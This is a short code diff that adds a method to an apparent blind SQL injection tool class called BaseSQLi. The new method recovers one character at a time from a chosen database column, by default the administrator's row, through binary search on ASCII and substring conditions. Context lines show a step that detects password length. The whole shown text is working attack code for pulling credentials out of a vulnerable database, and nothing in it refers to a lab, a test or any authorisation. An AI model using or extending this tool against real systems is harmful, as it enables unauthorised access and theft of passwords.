@@ -71,3 +71,18 @@ class BaseSQLi:
                 return length
         print("[-] Could not detect password length.")
         return None
+
+    def extract_char_binary(self, column, position, username='administrator'):
+        substr = DB_CONFIG[self.db_type]['substr']
+        low = 32
+        high = 126
+        while low < high:
+            mid = (low + high) // 2
+            condition = f"ASCII({substr}((SELECT {column} FROM {self.targetTable} WHERE username='{username}'),{position},1))>{mid}"
+            payload = self.build_condition_payload(condition)
+            response = self.send(payload)
+            if self.check_signal(response):
+                low = mid + 1
+            else:
+                high = mid
+        return chr(low)
